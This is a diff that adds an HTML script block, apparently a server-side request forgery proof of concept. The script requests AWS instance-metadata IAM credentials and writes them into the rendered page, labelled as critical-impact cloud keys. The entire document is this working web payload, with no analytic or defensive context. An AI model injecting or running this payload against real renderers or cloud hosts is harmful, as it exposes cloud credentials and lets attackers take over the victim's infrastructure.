@@ -1,0 +1,6 @@
+<script>
+  fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
+    .then(r => r.text())
+    .then(data => document.write("<b>CRITICAL IMPACT (Cloud Keys):</b> " + data))
+    .catch(e => document.write("Metadata blocked or not AWS."));
+</script>
